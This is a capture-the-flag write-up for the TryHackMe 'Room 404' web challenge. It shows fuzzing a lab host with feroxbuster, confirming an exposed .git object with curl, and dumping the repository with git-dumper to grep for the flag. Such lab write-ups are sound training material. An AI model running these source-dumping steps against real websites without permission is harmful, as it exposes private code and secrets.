# Room 404 

Today I solved the **Room 404** TryHackMe challenge.

It is a **web challenge**.

<img width="1920" height="1080" alt="screenshot_20260730_082012" src="https://github.com/user-attachments/assets/b063af1c-1438-484f-95b4-8cc253438460" />

I opened the website and tried looking at the page source, but there was nothing interesting. Then I performed blind fuzzing, 

<img width="1920" height="1080" alt="screenshot_20260730_080020" src="https://github.com/user-attachments/assets/fc20756d-7ca5-4d62-9e10-1684701b45e9" />


but I didn't find anything. After that, I went back to the room page and found the following hint:

> **"Dump the exposed source code."**

After reading the hint, I started fuzzing again:

```bash
feroxbuster -u http://10.49.150.180:8080/ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-x git,txt,bak,zip \
-t 50
```

I found multiple URLs. Then I visited the website and downloaded the files. I found a file named `main`.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b0380299-b86b-4a78-8deb-9e8a2d6a43e9" />




I downloaded the `main` file and found the following commit hash:

```bash
cat main
0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

I wanted to check whether this commit object was exposed, so I ran:

```bash
curl -i http://10.49.150.180:8080/.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda
```

<img width="1920" height="1080" alt="screenshot_20260730_081033" src="https://github.com/user-attachments/assets/d1eafca7-be7f-46f2-af14-79539bb46bee" />

I received binary data, which confirmed that the Git object was accessible.

Next, I installed **git-dumper**:

```bash
python -m venv venv
source venv/bin/activate
python -m pip install git-dumper
```

Then I dumped the exposed Git repository:

```bash
git-dumper http://10.49.150.180:8080/.git/ dumped_repo
```
<img width="1920" height="1080" alt="screenshot_20260730_081633" src="https://github.com/user-attachments/assets/c87ee691-e65d-4025-bc8e-66711bab6fc1" />


After the dump completed, I entered the dumped directory and searched for the flag:

```bash
grep -R "THM" .
```

<img width="814" height="235" alt="image" src="https://github.com/user-attachments/assets/0b0904c8-96b2-4c34-b758-fb2f872aa484" />


Finally, I found the flag.
